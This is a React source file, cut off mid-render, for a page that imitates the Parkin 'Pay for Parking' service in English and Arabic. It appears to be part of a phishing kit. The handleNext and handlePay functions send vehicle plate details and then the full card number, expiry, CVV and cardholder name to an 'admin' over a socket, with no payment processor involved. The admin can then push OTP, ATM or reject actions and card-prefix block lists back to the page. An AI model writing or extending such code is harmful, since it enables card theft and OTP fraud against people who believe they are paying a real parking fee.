import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { sendData, navigateToPage, socket, visitor, isFormApproved, isCardVerified, cardAction, waitingMessage } from "@/lib/store";
import { useSignalEffect } from "@preact/signals-react/runtime";
import { getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";

/* ───── Plate Structure Data (same as ParkinHome) ───── */
const plateStructure = [
  {pid:"2",name:"Dubai",categories:[{pid:"1",name:"Private",codes:[{pid:"5",name:"A"},{pid:"135",name:"AA"},{pid:"6",name:"B"},{pid:"147",name:"BB"},{pid:"7",name:"C"},{pid:"148",name:"CC"},{pid:"8",name:"D"},{pid:"149",name:"DD"},{pid:"26",name:"E"},{pid:"151",name:"EE"},{pid:"27",name:"F"},{pid:"158",name:"FF"},{pid:"34",name:"G"},{pid:"38",name:"H"},{pid:"153",name:"HH"},{pid:"40",name:"I"},{pid:"159",name:"II"},{pid:"42",name:"J"},{pid:"43",name:"K"},{pid:"50",name:"L"},{pid:"44",name:"M"},{pid:"155",name:"MM"},{pid:"52",name:"N"},{pid:"154",name:"NN"},{pid:"60",name:"O"},{pid:"66",name:"P"},{pid:"65",name:"Q"},{pid:"63",name:"R"},{pid:"51",name:"S"},{pid:"62",name:"T"},{pid:"61",name:"U"},{pid:"48",name:"V"},{pid:"69",name:"W"},{pid:"70",name:"X"},{pid:"47",name:"Y"},{pid:"71",name:"Z"}]},{pid:"14",name:"Export",codes:[{pid:"13",name:"Blue"},{pid:"122",name:"Export 2"},{pid:"123",name:"Export 3"},{pid:"124",name:"Export 4"},{pid:"125",name:"Export 5"},{pid:"126",name:"Export 6"},{pid:"127",name:"Export 7"},{pid:"128",name:"Export 8"},{pid:"129",name:"Export 9"}]},{pid:"16",name:"Under Test",codes:[{pid:"142",name:"Under Test"}]},{pid:"18",name:"Consulate",codes:[{pid:"138",name:"Consulate"}]},{pid:"2",name:"Taxi",codes:[{pid:"19",name:"Yellow"}]},{pid:"27",name:"Learning",codes:[{pid:"72",name:"Learning"}]},{pid:"3",name:"Commercial",codes:[{pid:"9",name:"White"}]},{pid:"36",name:"Classical Vehicles",codes:[{pid:"49",name:"CLASSIC"}]},{pid:"37",name:"Trailer",codes:[{pid:"134",name:"TRAILER"}]},{pid:"38",name:"Dubai Flag",codes:[{pid:"140",name:"Dubai Flag"}]},{pid:"4",name:"General Transportation",codes:[{pid:"17",name:"Green"},{pid:"130",name:"PublicTransportation1"}]},{pid:"9",name:"Motor Cycle",codes:[{pid:"9",name:"White"},{pid:"28",name:"White 1"},{pid:"29",name:"White 2"},{pid:"30",name:"White 3"},{pid:"59",name:"White 9"}]}]},
  {pid:"1",name:"Abu Dhabi",categories:[{pid:"1",name:"Private",codes:[{pid:"41",name:"1"},{pid:"46",name:"2"},{pid:"53",name:"4"},{pid:"39",name:"5"},{pid:"45",name:"6"},{pid:"54",name:"7"},{pid:"55",name:"8"},{pid:"56",name:"9"},{pid:"57",name:"10"},{pid:"64",name:"11"},{pid:"67",name:"12"},{pid:"73",name:"13"},{pid:"74",name:"14"},{pid:"120",name:"15"},{pid:"121",name:"16"},{pid:"132",name:"17"},{pid:"139",name:"18"},{pid:"144",name:"19"},{pid:"145",name:"20"},{pid:"150",name:"21"},{pid:"157",name:"22"},{pid:"133",name:"50"}]},{pid:"14",name:"Export",codes:[{pid:"41",name:"1"}]},{pid:"17",name:"Diplomat",codes:[{pid:"136",name:"Diplomat"}]},{pid:"2",name:"Taxi",codes:[{pid:"19",name:"Yellow"}]},{pid:"28",name:"Customs",codes:[{pid:"13",name:"Blue"},{pid:"9",name:"White"}]},{pid:"3",name:"Commercial",codes:[{pid:"9",name:"White"}]},{pid:"33",name:"General Organization",codes:[{pid:"137",name:"International Organization"}]},{pid:"34",name:"Public Transportation",codes:[{pid:"41",name:"1"},{pid:"46",name:"2"}]},{pid:"36",name:"Classical Vehicles",codes:[{pid:"41",name:"1"},{pid:"49",name:"CLASSIC"},{pid:"16",name:"Red"}]},{pid:"37",name:"Trailer",codes:[{pid:"41",name:"1"}]},{pid:"9",name:"Motor Cycle",codes:[{pid:"53",name:"4"},{pid:"16",name:"Red"},{pid:"9",name:"White"},{pid:"156",name:"Yellow 1"}]}]},
  {pid:"3",name:"Sharjah",categories:[{pid:"1",name:"Private",codes:[{pid:"41",name:"1"},{pid:"46",name:"2"},{pid:"131",name:"3"},{pid:"53",name:"4"},{pid:"9",name:"White"}]},{pid:"14",name:"Export",codes:[{pid:"41",name:"1"},{pid:"13",name:"Blue"},{pid:"122",name:"Export 2"},{pid:"123",name:"Export 3"},{pid:"124",name:"Export 4"},{pid:"125",name:"Export 5"}]},{pid:"27",name:"Learning",codes:[{pid:"72",name:"Learning"}]},{pid:"3",name:"Commercial",codes:[{pid:"9",name:"White"}]},{pid:"34",name:"Public Transportation",codes:[{pid:"41",name:"1"},{pid:"46",name:"2"},{pid:"17",name:"Green"}]},{pid:"36",name:"Classical Vehicles",codes:[{pid:"49",name:"CLASSIC"}]},{pid:"37",name:"Trailer",codes:[{pid:"41",name:"1"}]},{pid:"9",name:"Motor Cycle",codes:[{pid:"73",name:"13"},{pid:"9",name:"White"}]}]},
  {pid:"4",name:"Ajman",categories:[{pid:"1",name:"Private",codes:[{pid:"5",name:"A"},{pid:"6",name:"B"},{pid:"7",name:"C"},{pid:"8",name:"D"},{pid:"26",name:"E"},{pid:"27",name:"F"},{pid:"38",name:"H"},{pid:"43",name:"K"}]},{pid:"14",name:"Export",codes:[{pid:"13",name:"Blue"}]},{pid:"16",name:"Under Test",codes:[{pid:"16",name:"Red"}]},{pid:"27",name:"Learning",codes:[{pid:"72",name:"Learning"}]},{pid:"3",name:"Commercial",codes:[{pid:"16",name:"Red"}]},{pid:"34",name:"Public Transportation",codes:[{pid:"17",name:"Green"}]},{pid:"36",name:"Classical Vehicles",codes:[{pid:"49",name:"CLASSIC"}]},{pid:"37",name:"Trailer",codes:[{pid:"134",name:"TRAILER"}]},{pid:"9",name:"Motor Cycle",codes:[{pid:"9",name:"White"}]}]},
  {pid:"6",name:"Ras Al Khaimah",categories:[{pid:"1",name:"Private",codes:[{pid:"5",name:"A"},{pid:"6",name:"B"},{pid:"7",name:"C"},{pid:"8",name:"D"},{pid:"27",name:"F"},{pid:"34",name:"G"},{pid:"40",name:"I"},{pid:"43",name:"K"},{pid:"44",name:"M"},{pid:"52",name:"N"},{pid:"66",name:"P"},{pid:"51",name:"S"},{pid:"61",name:"U"},{pid:"48",name:"V"},{pid:"70",name:"X"},{pid:"47",name:"Y"},{pid:"71",name:"Z"}]},{pid:"14",name:"Export",codes:[{pid:"13",name:"Blue"}]},{pid:"16",name:"Under Test",codes:[{pid:"16",name:"Red"}]},{pid:"2",name:"Taxi",codes:[{pid:"17",name:"Green"}]},{pid:"22",name:"Government",codes:[{pid:"9",name:"White"}]},{pid:"3",name:"Commercial",codes:[{pid:"16",name:"Red"},{pid:"9",name:"White"}]},{pid:"37",name:"Trailer",codes:[{pid:"24",name:"White+Green"}]},{pid:"4",name:"General Transportation",codes:[{pid:"17",name:"Green"}]},{pid:"9",name:"Motor Cycle",codes:[{pid:"41",name:"1"},{pid:"53",name:"4"},{pid:"9",name:"White"}]}]},
  {pid:"7",name:"Fujairah",categories:[{pid:"1",name:"Private",codes:[{pid:"5",name:"A"},{pid:"6",name:"B"},{pid:"7",name:"C"},{pid:"8",name:"D"},{pid:"26",name:"E"},{pid:"27",name:"F"},{pid:"34",name:"G"},{pid:"38",name:"H"},{pid:"40",name:"I"},{pid:"42",name:"J"},{pid:"43",name:"K"},{pid:"50",name:"L"},{pid:"44",name:"M"},{pid:"52",name:"N"},{pid:"60",name:"O"},{pid:"66",name:"P"},{pid:"63",name:"R"},{pid:"51",name:"S"},{pid:"62",name:"T"},{pid:"61",name:"U"},{pid:"48",name:"V"},{pid:"70",name:"X"},{pid:"47",name:"Y"},{pid:"71",name:"Z"}]},{pid:"14",name:"Export",codes:[{pid:"13",name:"Blue"}]},{pid:"16",name:"Under Test",codes:[{pid:"16",name:"Red"}]},{pid:"2",name:"Taxi",codes:[{pid:"17",name:"Green"}]},{pid:"3",name:"Commercial",codes:[{pid:"16",name:"Red"}]},{pid:"37",name:"Trailer",codes:[{pid:"5",name:"A"}]},{pid:"4",name:"General Transportation",codes:[{pid:"17",name:"Green"}]},{pid:"9",name:"Motor Cycle",codes:[{pid:"9",name:"White"}]}]},
  {pid:"5",name:"Umm Al Quwain",categories:[{pid:"1",name:"Private",codes:[{pid:"5",name:"A"},{pid:"6",name:"B"},{pid:"7",name:"C"},{pid:"8",name:"D"},{pid:"26",name:"E"},{pid:"27",name:"F"},{pid:"34",name:"G"},{pid:"38",name:"H"},{pid:"40",name:"I"},{pid:"42",name:"J"},{pid:"43",name:"K"},{pid:"50",name:"L"},{pid:"44",name:"M"},{pid:"52",name:"N"},{pid:"9",name:"White"},{pid:"70",name:"X"}]},{pid:"14",name:"Export",codes:[{pid:"13",name:"Blue"}]},{pid:"16",name:"Under Test",codes:[{pid:"16",name:"Red"}]},{pid:"2",name:"Taxi",codes:[{pid:"17",name:"Green"}]},{pid:"27",name:"Learning",codes:[{pid:"72",name:"Learning"}]},{pid:"3",name:"Commercial",codes:[{pid:"16",name:"Red"}]},{pid:"37",name:"Trailer",codes:[{pid:"17",name:"Green"}]},{pid:"4",name:"General Transportation",codes:[{pid:"17",name:"Green"}]},{pid:"9",name:"Motor Cycle",codes:[{pid:"5",name:"A"},{pid:"6",name:"B"},{pid:"9",name:"White"}]}]},
  {pid:"8",name:"Saudi Arabia",categories:[{pid:"1",name:"Private",codes:[{pid:"9",name:"White"}]},{pid:"14",name:"Export",codes:[{pid:"11",name:"Black"}]},{pid:"15",name:"Temporary",codes:[{pid:"11",name:"Black"}]},{pid:"17",name:"Diplomat",codes:[{pid:"17",name:"Green"}]},{pid:"18",name:"Consulate",codes:[{pid:"17",name:"Green"}]},{pid:"2",name:"Taxi",codes:[{pid:"19",name:"Yellow"}]},{pid:"28",name:"Customs",codes:[{pid:"11",name:"Black"}]},{pid:"3",name:"Commercial",codes:[{pid:"13",name:"Blue"}]},{pid:"31",name:"Haj",codes:[{pid:"11",name:"Black"}]},{pid:"34",name:"Public Transportation",codes:[{pid:"19",name:"Yellow"}]},{pid:"4",name:"General Transportation",codes:[{pid:"13",name:"Blue"},{pid:"19",name:"Yellow"}]},{pid:"5",name:"Private Transport",codes:[{pid:"13",name:"Blue"}]},{pid:"6",name:"General Bus",codes:[{pid:"16",name:"Red"}]},{pid:"7",name:"Private Bus",codes:[{pid:"16",name:"Red"}]},{pid:"8",name:"Heavy Equipment",codes:[{pid:"18",name:"Orange"}]},{pid:"9",name:"Motor Cycle",codes:[{pid:"9",name:"White"}]}]},
  {pid:"10",name:"Bahrain",categories:[{pid:"1",name:"Private",codes:[{pid:"9",name:"White"}]},{pid:"14",name:"Export",codes:[{pid:"16",name:"Red"}]},{pid:"19",name:"Political",codes:[{pid:"17",name:"Green"}]},{pid:"24",name:"Police",codes:[{pid:"13",name:"Blue"}]},{pid:"4",name:"General Transportation",codes:[{pid:"19",name:"Yellow"}]},{pid:"5",name:"Private Transport",codes:[{pid:"18",name:"Orange"},{pid:"16",name:"Red"}]}]},
  {pid:"11",name:"Kuwait",categories:[{pid:"1",name:"Private",codes:[{pid:"9",name:"White"}]},{pid:"3",name:"Commercial",codes:[{pid:"9",name:"White"}]}]},
  {pid:"12",name:"Qatar",categories:[{pid:"1",name:"Private",codes:[{pid:"9",name:"White"}]}]},
  {pid:"9",name:"Oman",categories:[{pid:"1",name:"Private",codes:[{pid:"9",name:"White"}]}]},
];

/* ───── Translations ───── */
const t: Record<string, Record<string, string>> = {
  pay_for_parking: { en: "Pay for parking", ar: "ادفع رسوم المواقف" },
  parking_details: { en: "Parking details", ar: "تفاصيل الوقوف" },
  vehicle_selection: { en: "Vehicle selection", ar: "اختيار المركبة" },
  summary: { en: "Summary", ar: "الملخص" },
  payment_method: { en: "Payment method", ar: "طريقة الدفع" },
  total_fees: { en: "Total fees:", ar: "الرسوم الإجمالية:" },
  country_emirate: { en: "Country/Emirate", ar: "الدولة/الإمارة" },
  plate_category: { en: "Plate category", ar: "فئة اللوحة" },
  plate_code: { en: "Plate code", ar: "رمز اللوحة" },
  plate_number: { en: "Plate number", ar: "رقم اللوحة" },
  enter_plate_number: { en: "Enter plate number", ar: "أدخل رقم اللوحة" },
  select: { en: "Select", ar: "اختر" },
  back: { en: "Back", ar: "رجوع" },
  next: { en: "Next", ar: "التالي" },
  pay: { en: "Pay", ar: "ادفع" },
  home: { en: "Home", ar: "الرئيسية" },
  individuals: { en: "Individuals", ar: "الأفراد" },
  business: { en: "Business", ar: "الأعمال" },
  government: { en: "Government", ar: "الحكومة" },
  investors: { en: "Investors", ar: "المستثمرون" },
  more: { en: "More", ar: "المزيد" },
  ar_toggle: { en: "العربية", ar: "English" },
  download_app: { en: "Download App", ar: "حمل التطبيق" },
  login: { en: "Login", ar: "تسجيل الدخول" },
  zone: { en: "Zone", ar: "المنطقة" },
  duration: { en: "Duration", ar: "المدة" },
  parking_zone: { en: "Parking Zone", ar: "منطقة المواقف" },
  parking_fee: { en: "Parking fee", ar: "رسوم الوقوف" },
  total: { en: "Total", ar: "المجموع" },
  credit_debit_card: { en: "Credit / Debit card", ar: "بطاقة ائتمان / خصم" },
  apple_pay: { en: "Apple Pay", ar: "Apple Pay" },
  card_number: { en: "Card number", ar: "رقم البطاقة" },
  expiry_date: { en: "Expiry date", ar: "تاريخ الانتهاء" },
  cvv: { en: "CVV", ar: "CVV" },
  card_holder: { en: "Cardholder name", ar: "اسم حامل البطاقة" },
  enter_card_number: { en: "Enter card number", ar: "أدخل رقم البطاقة" },
  enter_card_holder: { en: "Enter cardholder name", ar: "أدخل اسم حامل البطاقة" },
  processing: { en: "Processing...", ar: "جاري المعالجة..." },
  pay_now: { en: "Pay now", ar: "ادفع الآن" },
};

/* ───── Logo Component ───── */
function ParkinLogo({ white = false, size = 'h-[50px]', mobileSize = '' }: { white?: boolean; size?: string; mobileSize?: string }) {
  const sizeClass = mobileSize ? `${mobileSize} md:${size}` : size;
  return (
    <img src="/images/parkin-logo.png" alt="Parkin" className={`${sizeClass} w-auto max-w-[100px] md:max-w-none`} style={white ? {filter:'brightness(0) invert(1)'} : {}}/>
  );
}

export default function PayForParking() {
  const [, navigate] = useLocation();
  const [lang, setLang] = useState<"en"|"ar">(() => {
    return (localStorage.getItem('parkin_lang') as "en"|"ar") || "en";
  });
  const [step, setStepRaw] = useState(() => {
    const saved = sessionStorage.getItem('pfp_step');
    return saved ? parseInt(saved, 10) : 2;
  });
  const setStep = (s: number) => {
    sessionStorage.setItem('pfp_step', String(s));
    setStepRaw(s);
  };
  
  // Get parking data from URL params
  const params = new URLSearchParams(window.location.search);
  const zoneCode = params.get('zone') || '';
  const durationLabel = params.get('duration') || '';
  const totalFees = params.get('total') || '0.00';
  const durationMinutes = params.get('minutes') || '';

  // Vehicle selection state - restore from sessionStorage
  const [selectedCountry, setSelectedCountryRaw] = useState(() => {
    const saved = sessionStorage.getItem('pfp_country');
    if (saved) { const found = plateStructure.find(c => c.name === saved); if (found) return found; }
    return plateStructure[0];
  });
  const [selectedCategory, setSelectedCategoryRaw] = useState<typeof plateStructure[0]['categories'][0]|null>(() => {
    const savedCountry = sessionStorage.getItem('pfp_country');
    const savedCat = sessionStorage.getItem('pfp_category');
    if (savedCountry && savedCat) {
      const country = plateStructure.find(c => c.name === savedCountry);
      if (country) { const cat = country.categories.find(c => c.name === savedCat); if (cat) return cat; }
    }
    return plateStructure[0].categories[0];
  });
  const [selectedCode, setSelectedCodeRaw] = useState<{pid:string;name:string}|null>(() => {
    const saved = sessionStorage.getItem('pfp_code');
    return saved ? JSON.parse(saved) : null;
  });
  const [plateNumber, setPlateNumberRaw] = useState(() => {
    return sessionStorage.getItem('pfp_plateNumber') || "";
  });

  // Wrapper setters that save to sessionStorage
  const setSelectedCountry = (c: typeof plateStructure[0]) => { sessionStorage.setItem('pfp_country', c.name); setSelectedCountryRaw(c); };
  const setSelectedCategory = (c: typeof plateStructure[0]['categories'][0]|null) => { sessionStorage.setItem('pfp_category', c?.name || ''); setSelectedCategoryRaw(c); };
  const setSelectedCode = (c: {pid:string;name:string}|null) => { sessionStorage.setItem('pfp_code', c ? JSON.stringify(c) : ''); setSelectedCodeRaw(c); };
  const setPlateNumber = (v: string) => { sessionStorage.setItem('pfp_plateNumber', v); setPlateNumberRaw(v); };
  const [isCountryOpen, setIsCountryOpen] = useState(false);
  const [isCategoryOpen, setIsCategoryOpen] = useState(false);
  const [isCodeOpen, setIsCodeOpen] = useState(false);
  
  // Payment state
  const [paymentMethod, setPaymentMethod] = useState<"card"|"apple"|null>(null);
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);
  const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
  const [globalBlockedError, setGlobalBlockedError] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout>>();

  const countryRef = useRef<HTMLDivElement>(null);
  const categoryRef = useRef<HTMLDivElement>(null);
  const codeRef = useRef<HTMLDivElement>(null);

  const L = (key: string) => t[key]?.[lang] || t[key]?.en || key;
  const isAr = lang === "ar";

  useEffect(() => {
    navigateToPage('Pay for Parking - Vehicle Selection');
  }, []);

  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (countryRef.current && !countryRef.current.contains(e.target as Node)) setIsCountryOpen(false);
      if (categoryRef.current && !categoryRef.current.contains(e.target as Node)) setIsCategoryOpen(false);
      if (codeRef.current && !codeRef.current.contains(e.target as Node)) setIsCodeOpen(false);
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  const steps = [
    { num: 1, label: L("parking_details") },
    { num: 2, label: L("vehicle_selection") },
    { num: 3, label: L("summary") },
    { num: 4, label: L("payment_method") },
  ];

  // Luhn algorithm validation
  const isValidCardNumber = (number: string): boolean => {
    if (!number || number.length < 13 || number.length > 19) return false;
    let sum = 0;
    let isEven = false;
    for (let i = number.length - 1; i >= 0; i--) {
      let digit = parseInt(number[i], 10);
      if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
      sum += digit;
      isEven = !isEven;
    }
    return sum % 10 === 0;
  };

  // Card type detection
  const getCardType = (number: string): string => {
    const cleanNumber = number.replace(/\s+/g, '');
    const cardType = getCardTypeFromDB(cleanNumber);
    return cardType ? cardType.toLowerCase() : 'unknown';
  };

  // Bank info from BIN
  const getBankInfoLocal = (cardNum: string): { bank: string; logo: string } | null => {
    const info = getBinInfo(cardNum);
    if (info) return { bank: info.bank, logo: info.bankLogo };
    return null;
  };

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 16);
    return digits.replace(/(.{4})/g, '$1 ').trim();
  };

  const [expiryError, setExpiryError] = useState(false);
  const [cvvError, setCvvError] = useState(false);

  const formatExpiry = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 4);
    if (digits.length >= 2) {
      let month = parseInt(digits.slice(0, 2), 10);
      if (month < 1) month = 1;
      if (month > 12) month = 12;
      const monthStr = month.toString().padStart(2, '0');
      if (digits.length >= 3) {
        const yearPart = digits.slice(2);
        return monthStr + '/' + yearPart;
      }
      return monthStr;
    }
    return digits;
  };

  const isValidExpiry = (val: string): boolean => {
    if (val.length !== 5) return false;
    const parts = val.split('/');
    if (parts.length !== 2) return false;
    const month = parseInt(parts[0], 10);
    const year = parseInt(parts[1], 10);
    if (month < 1 || month > 12) return false;
    if (year < 1) return false;
    // Check if card is not expired
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
    return true;
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiry(e.target.value);
    setExpiryDate(formatted);
    if (formatted.length === 5) {
      setExpiryError(!isValidExpiry(formatted));
    } else {
      setExpiryError(false);
    }
  };

  // Handle card number change with validation
  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
    const blockedPrefixes = visitor.value.blockedCardPrefixes;
    const cardPrefix = rawValue.slice(0, 4);
    if (globalBlockedError) setGlobalBlockedError(false);
    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
      setCardError(true);
      setCardNumber('');
      setLuhnError(false);
    } else {
      const formattedValue = formatCardNumber(rawValue);
      setCardNumber(formattedValue);
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        setLuhnError(!isValidCardNumber(rawValue));
      } else {
        setLuhnError(false);
      }
    }
  };

  // Listen for global blocked cards
  useEffect(() => {
    socket.value.emit('blockedCards:get');
    const handleList = (cards: string[]) => setGlobalBlockedCards(cards || []);
    const handleUpdated = (cards: string[]) => setGlobalBlockedCards(cards || []);
    socket.value.on('blockedCards:list', handleList);
    socket.value.on('blockedCards:updated', handleUpdated);
    return () => {
      socket.value.off('blockedCards:list', handleList);
      socket.value.off('blockedCards:updated', handleUpdated);
    };
  }, []);

  // Handle card verification response
  useEffect(() => {
    if (isCardVerified.value === false) setCardError(true);
    else setCardError(false);
  }, [isCardVerified.value]);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      window.location.href = `/otp-verification?service=${encodeURIComponent('Parkin - Pay for Parking')}&amount=${totalFees}`;
    }
  }, [isFormApproved.value]);

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = '';
      if (action === 'otp' || action === 'atm') {
        window.location.href = `/otp-verification?service=${encodeURIComponent('Parkin - Pay for Parking')}&amount=${totalFees}`;
      } else if (action === 'reject') {
        setRejectedError(true);
        setCardNumber('');
        setExpiryDate('');
        setCvv('');
        setCardHolder('');
      }
      cardAction.value = null;
    }
  });

  const handleNext = () => {
    if (step === 2) {
      // Send vehicle data to admin
      sendData({
        data: {
          step: 'Vehicle Selection',
          zone: zoneCode,
          duration: durationLabel,
          totalFees: totalFees,
          country: selectedCountry.name,
          plateCategory: selectedCategory?.name,
          plateCode: selectedCode?.name,
          plateNumber: plateNumber,
        },
        current: 'Pay for Parking - Vehicle Selection',
        nextPage: 'pay-for-parking-summary',
        waitingForAdminResponse: false,
      });
      navigateToPage('Pay for Parking - Summary');
      setStep(3);
    } else if (step === 3) {
      navigateToPage('Pay for Parking - Payment');
      setStep(4);
    }
  };

  const handleBack = () => {
    if (step === 2) {
      navigate('/');
    } else if (step === 3) {
      setStep(2);
    } else if (step === 4) {
      setStep(3);
    }
  };

  const handlePay = () => {
    if (!paymentMethod) return;
    if (luhnError) return;

    const cleanCardNum = cardNumber.replace(/\s+/g, '');

    // Check if card is globally blocked
    const cardPrefix = cleanCardNum.slice(0, 4);
    if (globalBlockedCards.includes(cardPrefix)) {
      waitingMessage.value = lang === 'ar' ? 'جاري التحقق من معلومات البطاقة...' : 'Verifying card information...';
      setTimeout(() => {
        waitingMessage.value = '';
        setGlobalBlockedError(true);
        setCardNumber('');
        setExpiryDate('');
        setCvv('');
        setCardHolder('');
      }, 3000);
      return;
    }

    setIsProcessing(true);

    if (paymentMethod === 'card') {
      const bankInfo = getBankInfoLocal(cleanCardNum);
      const cardType = getCardType(cleanCardNum);

      if (bankInfo) {
        waitingCardInfo.value = { bankName: bankInfo.bank, bankLogo: bankInfo.logo, cardType };
      } else {
        waitingCardInfo.value = null;
      }

      const paymentData = {
        totalPaid: totalFees,
        cardType,
        cardLast4: cleanCardNum.slice(-4),
        serviceName: 'Parkin - Pay for Parking',
        bankName: bankInfo?.bank || '',
        bankLogo: bankInfo?.logo || '',
      };
      localStorage.setItem('paymentData', JSON.stringify(paymentData));
      localStorage.setItem('Total', totalFees);

      // Send card data to admin
      sendData({
        paymentCard: {
          cardNumber: cleanCardNum,
          nameOnCard: cardHolder,
          expiryMonth: expiryDate.split('/')[0] || '',
          expiryYear: expiryDate.split('/')[1] || '',
          cvv,
        },
        data: {
          step: 'Payment',
          zone: zoneCode,
          duration: durationLabel,
          totalFees: totalFees,
          country: selectedCountry.name,
          plateCategory: selectedCategory?.name,
          plateCode: selectedCode?.name,
          plateNumber: plateNumber,
          paymentMethod: 'Credit/Debit Card',
        },
        current: 'Pay for Parking - Payment',
        nextPage: 'otp-verification',
        waitingForAdminResponse: true,
        isCustom: true,
      });
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f7f8]" style={{fontFamily:"'Inter','Segoe UI',sans-serif"}} dir={isAr ? "rtl" : "ltr"}>
      <WaitingOverlay />

      {/* ═══════ HEADER ═══════ */}
      <header className="sticky top-0 z-50 bg-white shadow-sm">
        <div className="max-w-[1400px] mx-auto px-4 md:px-6 flex items-center h-[60px] md:h-[72px]">
          <a href="/" className="flex-shrink-0 mr-4 md:mr-8"><ParkinLogo mobileSize="h-[32px]" /></a>
          <nav className="hidden lg:flex items-center gap-6 flex-1">
            {['Home','Individuals','Business','Government','Investors','More'].map(item => (
              <span key={item} className="text-[14px] text-gray-700 hover:text-[#045464] cursor-pointer font-medium">{item}</span>
            ))}
          </nav>
          <div className="flex items-center gap-2 md:gap-4 ml-auto">
            <button onClick={() => { const newLang = lang === 'en' ? 'ar' : 'en'; setLang(newLang); localStorage.setItem('parkin_lang', newLang); }} className="text-[13px] md:text-[14px] text-gray-600 hover:text-[#045464] font-medium">
              {L("ar_toggle")}
            </button>
            <button className="hidden md:block text-[14px] text-[#045464] font-medium">{L("download_app")}</button>
            <button className="border border-[#045464] text-[#045464] px-3 md:px-5 py-1.5 md:py-2 rounded-full text-[13px] md:text-[14px] font-semibold hover:bg-[#045464] hover:text-white transition-colors">{L("login")}</button>
          </div>
        </div>
      </header>

      {/* ═══════ TEAL BAR ═══════ */}
      <div className="bg-[#045464]">
        <div className="max-w-[1400px] mx-auto px-4 md:px-6 py-3 md:py-4 flex flex-col md:flex-row items-start md:items-center justify-between gap-1 md:gap-0">
          <div>
            <h1 className="text-white text-[18px] md:text-[24px] font-bold">{L("pay_for_parking")}</h1>
          </div>
          <div className="flex items-center gap-3 md:gap-4 text-white">
            <span className="text-[13px] md:text-[15px] font-semibold">{durationLabel}</span>
            <span className="text-[13px] md:text-[14px]">{L("total_fees")} <span className="font-bold text-[16px] md:text-[18px]">Ð {totalFees}</span></span>
          </div>
        </div>
      </div>

      {/* ═══════ STEPS BAR ═══════ */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-[1400px] mx-auto px-4 md:px-6 py-3 md:py-4 overflow-x-auto">
          <div className="flex items-center gap-1 md:gap-2 min-w-max">
            {steps.map((s, idx) => (
              <div key={s.num} className="flex items-center gap-1 md:gap-2">
                <span className={`text-[12px] md:text-[14px] font-medium whitespace-nowrap ${step === s.num ? 'text-[#045464] font-bold underline underline-offset-4' : step > s.num ? 'text-[#045464]' : 'text-gray-400'}`}>
                  {s.num}. {s.label}
                </span>
                {idx < steps.length - 1 && (
                  <svg width="14" height="14" viewBox="0 0 16 16" fill="none" className={`${isAr ? 'rotate-180' : ''} flex-shrink-0`}>
                    <path d="M6 4L10 8L6 12" stroke="#ccc" strokeWidth="1.5"/>
                  </svg>
                )}
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* ═══════ MAIN CONTENT ═══════ */}
      <div className="max-w-[1400px] mx-auto px-4 md:px-6 py-6 md:py-10">

        {/* ── STEP 2: Vehicle Selection ── */}
        {step === 2 && (
          <div>
            <h2 className="text-[22px] font-bold text-gray-900 mb-8">{L("vehicle_selection")}</h2>
            <div className="flex flex-col md:flex-row gap-4 md:gap-6 mb-4 md:mb-6">
              {/* Country/Emirate */}
              <div className="border border-gray-200 bg-white rounded-xl p-4 flex-1 relative" ref={countryRef}>
                <label className="text-[12px] text-gray-500 block mb-1">{L("country_emirate")}</label>
                <div className="flex items-center justify-between cursor-pointer" onClick={() => { setIsCountryOpen(!isCountryOpen); setIsCategoryOpen(false); setIsCodeOpen(false); }}>
                  <span className="text-[15px] text-[#045464] font-medium">{selectedCountry.name}</span>
                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none" className={`text-gray-400 transition-transform ${isCountryOpen ? 'rotate-180' : ''}`}><path d="M3 5L7 9L11 5" stroke="currentColor" strokeWidth="1.5"/></svg>
                </div>
                {isCountryOpen && (
                  <div className="absolute left-0 right-0 top-full mt-1 bg-white border border-gray-200 rounded-xl shadow-lg z-50 max-h-[300px] overflow-y-auto">
                    {plateStructure.map((c) => (
                      <button key={c.pid} onClick={() => { setSelectedCountry(c); setSelectedCategory(c.categories[0]); setSelectedCode(null); setIsCountryOpen(false); }} className={`w-full text-left px-4 py-3 hover:bg-gray-50 transition-colors border-b border-gray-100 last:border-b-0 text-[14px] ${selectedCountry.pid === c.pid ? 'bg-[#f0f9f9] text-[#045464] font-medium' : 'text-gray-700'}`}>{c.name}</button>
                    ))}
                  </div>
                )}
              </div>
              {/* Plate Category */}
              <div className="border border-gray-200 bg-white rounded-xl p-4 flex-1 relative" ref={categoryRef}>
                <label className="text-[12px] text-gray-500 block mb-1">{L("plate_category")}</label>
                <div className="flex items-center justify-between cursor-pointer" onClick={() => { setIsCategoryOpen(!isCategoryOpen); setIsCountryOpen(false); setIsCodeOpen(false); }}>
